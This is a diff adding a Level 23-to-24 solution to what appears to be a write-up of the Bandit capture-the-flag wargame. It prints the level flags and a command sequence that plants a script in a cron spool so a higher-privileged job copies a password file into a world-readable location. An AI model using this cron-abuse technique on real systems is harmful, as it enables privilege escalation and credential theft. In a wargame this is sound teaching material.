@@ -251,3 +251,21 @@ Server Information
 > cat /tmp/8ca319486bfbbc3663ea0fbe81326349
 
 :pirate_flag: **`jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n`**
+
+---
+
+**Level 23 &#8680; 24**
+
+> ```bash
+> cat /etc/cron.d/cronjob_bandit24
+> cat /usr/bin/cronjob_bandit24.sh
+> mkdir /tmp/yourname123
+> chmod 777 /tmp/yourname123
+> cd /tmp/yourname123
+> touch script password
+> chmod 777 *
+> echo "#!/usr/bin/env bash \n cat /etc/bandit_pass/bandit24 > /tmp/yourname123/password" > script
+> cp script /var/spool/bandit24/
+> cat password
+
+:pirate_flag: **`UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ`**
